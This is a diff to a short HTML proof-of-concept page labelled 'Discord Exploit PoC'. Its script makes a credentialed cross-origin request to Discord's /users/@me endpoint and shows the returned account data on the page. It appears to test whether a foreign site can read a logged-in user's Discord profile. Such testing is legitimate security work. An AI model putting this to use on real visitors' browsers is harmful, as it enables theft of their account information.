@@ -1,19 +1,43 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Discord Security PoC</title>
+    <style>
+        body { font-family: monospace; background: #000; color: #00ff00; padding: 20px; }
+        .container { border: 1px solid #00ff00; padding: 20px; border-radius: 5px; }
+        h1 { color: #ff0000; text-transform: uppercase; }
+        #data { white-space: pre-wrap; word-break: break-all; margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
+    </style>
+</head>
 <body>
-    <h1 style="color: red;">Discord Security PoC</h1>
-    <div id="data">Đang lấy dữ liệu...</div>
+    <div class="container">
+        <h1>Discord Exploit PoC</h1>
+        <div>Status: <span id="status">Fetching data...</span></div>
+        <div id="data"></div>
+    </div>
+
     <script>
+        const statusEl = document.getElementById("status");
+        const dataEl = document.getElementById("data");
+
         fetch("https://discord.com/api/v9/users/@me", {
             method: "GET",
+            headers: { "Content-Type": "application/json" },
             credentials: "include"
         })
-        .then(res => res.json())
+        .then(res => {
+            if (!res.ok) throw new Error("Unauthorized: Please login to Discord on this browser.");
+            return res.json();
+        })
         .then(json => {
-            document.getElementById("data").innerHTML = "<pre>" + JSON.stringify(json, null, 2) + "</pre>";
+            statusEl.innerText = "SUCCESS";
+            statusEl.style.color = "#00ff00";
+            dataEl.innerText = JSON.stringify(json, null, 4);
         })
         .catch(err => {
-            document.getElementById("data").innerHTML = "Lỗi: " + err;
+            statusEl.innerText = "FAILED";
+            statusEl.style.color = "#ff0000";
+            dataEl.innerText = err.message;
         });
     </script>
 </body>
